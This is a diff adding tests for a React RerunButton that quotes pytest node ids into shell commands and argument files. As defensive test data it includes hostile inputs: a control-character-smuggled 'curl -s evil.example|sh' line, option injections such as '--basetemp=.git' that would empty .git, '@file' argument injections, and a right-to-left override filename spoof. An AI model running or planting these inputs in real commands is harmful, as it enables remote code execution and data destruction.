@@ -1,12 +1,27 @@
 import { act, fireEvent, render, screen } from '@testing-library/react';
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { RerunButton, rerunCommand, shellQuote } from './RerunButton';
+import { pytestArg, RerunButton, rerunCommand, rerunFile, shellQuote } from './RerunButton';
 
 const UART = 'tests/comms/test_uart.py::test_framing_at_921600';
 const RAIL = 'tests/power/test_rails.py::test_rail_ripple[3V3]';
 
 function ids(n: number): string[] {
   return Array.from({ length: n }, (_, i) => `tests/test_many.py::test_case[${i}]`);
+}
+
+// A text's lines as Python's str.splitlines gives them, as pytest reads a file of arguments.
+function splitlines(text: string): string[] {
+  const breaks = [0x0a, 0x0b, 0x0c, 0x0d, 0x1c, 0x1d, 0x1e, 0x85, 0x2028, 0x2029];
+  const lines: string[] = [];
+  let line = '';
+  for (const ch of text) {
+    if (breaks.includes(ch.codePointAt(0) ?? 0)) {
+      lines.push(line);
+      line = '';
+    } else line += ch;
+  }
+  if (line) lines.push(line);
+  return lines;
 }
 
 function stubClipboard() {
@@ -37,6 +52,39 @@ describe('the command', () => {
   it('runs pytest on exactly the given tests and adds no --vantage', () => {
     expect(rerunCommand([UART, RAIL])).toBe(`pytest ${UART} '${RAIL}'`);
     expect(rerunCommand([UART])).not.toContain('--vantage');
+  });
+
+  it('never lets a node id be read as an option or a file of arguments', () => {
+    // pytest would take the first as its temporary directory, emptying .git, and the second as a
+    // file to read more arguments from.
+    expect(rerunCommand(['--basetemp=.git', '@x', '-pevil', UART])).toBe(
+      `pytest ./--basetemp=.git ./@x ./-pevil ${UART}`,
+    );
+    expect(rerunCommand(['--junitxml=../a b'])).toBe("pytest './--junitxml=../a b'");
+    expect(pytestArg('tests/-a.py::t')).toBe('tests/-a.py::t');
+    expect(pytestArg('tests/a.py::t[-1]')).toBe('tests/a.py::t[-1]');
+  });
+
+  it('writes control and hidden characters as escapes, so the command carries none', () => {
+    const RLO = String.fromCodePoint(0x202e);
+    // Pasted raw, ^U would erase the line so far and the line break run what followed it.
+    expect(shellQuote('t.py::t\u0015curl -s evil.example|sh\n')).toBe(
+      "$'t.py::t\\025curl -s evil.example|sh\\012'",
+    );
+    expect(rerunCommand([`suite.py::test_hostile_id[${RLO}gnp.exe]`])).toBe(
+      "pytest $'suite.py::test_hostile_id[\\342\\200\\256gnp.exe]'",
+    );
+    // Within $'...', a quote and a backslash are escaped; tabs, C1 controls and every character
+    // shown as a code point go as bytes.
+    expect(shellQuote("a'b\\c\td\u0085e\u200bf")).toBe(
+      "$'a\\'b\\\\c\\011d\\302\\205e\\342\\200\\213f'",
+    );
+    // A quote alone still goes in single quotes.
+    expect(shellQuote("it's")).toBe("'it'\\''s'");
+    for (const id of ['t\u0015x', `t${RLO}x`, 't\u001bx', 't\u2028x', 't\ufffdx']) {
+      const cmd = rerunCommand([id]);
+      expect(cmd).toMatch(/^[\x20-\x7e]*$/);
+    }
   });
 });
 
@@ -151,12 +199,59 @@ describe('past its limit', () => {
     expect(document.querySelector('a[download]')).toBeNull();
     expect(blobs).toHaveLength(1);
     expect(blobs[0]?.type).toBe('text/plain');
-    expect(await blobs[0]?.text()).toBe(`${list.join('\n')}\n`);
+    expect(await blobs[0]?.text()).toBe(`${['--', ...list].join('\n')}\n`);
     expect(revoke).not.toHaveBeenCalled();
     act(() => {
       vi.runAllTimers();
     });
     expect(revoke).toHaveBeenCalledWith('blob:http://localhost/0d7e');
+  });
+
+  it('opens its file with --, and never lets a line be an option or another file', async () => {
+    const { blobs } = stubDownload();
+    const list = ['--basetemp=.git', '@other.txt', ...ids(19)];
+    render(<RerunButton nodeids={list} fileName="new-failures.txt" />);
+    fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
+    expect(await blobs[0]?.text()).toBe(
+      `${['--', './--basetemp=.git', './@other.txt', ...ids(19)].join('\n')}\n`,
+    );
+  });
+
+  it('leaves out a node id holding a line break, and says so', async () => {
+    const { blobs } = stubDownload();
+    const broken = [
+      'tests/x.py::t\u2028--basetemp=.git',
+      'tests/x.py::t\n-x',
+      'tests/x.py::t\r1',
+      'tests/x.py::t\u000b2',
+      'tests/x.py::t\u000c3',
+      'tests/x.py::t\u001c4',
+      'tests/x.py::t\u00855',
+      'tests/x.py::t\u20296',
+    ];
+    const kept = ids(21);
+    const { container } = render(
+      <RerunButton nodeids={[...broken, ...kept]} fileName="new-failures.txt" />,
+    );
+    expect(container).toHaveTextContent(
+      '8 node ids hold a line break, so the file leaves them out',
+    );
+    fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
+    const text = (await blobs[0]?.text()) ?? '';
+    expect(text).toBe(`${['--', ...kept].join('\n')}\n`);
+    // Split as pytest splits a file of arguments, every line is one it was given.
+    expect(splitlines(text)).toEqual(['--', ...kept]);
+    expect(rerunFile(broken)).toEqual({ text: '--\n', kept: 0, left: 8 });
+  });
+
+  it('offers no file when no node id fits one', () => {
+    const { container } = render(
+      <RerunButton nodeids={['a\nb', 'c\nd', 'e\nf']} limit={2} fileName="new-failures.txt" />,
+    );
+    expect(screen.queryByRole('button')).toBeNull();
+    expect(container).toHaveTextContent(
+      '3 node ids hold a line break, so the file leaves them out',
+    );
   });
 
   it('takes its own limit, and names its file rerun.txt by default', () => {
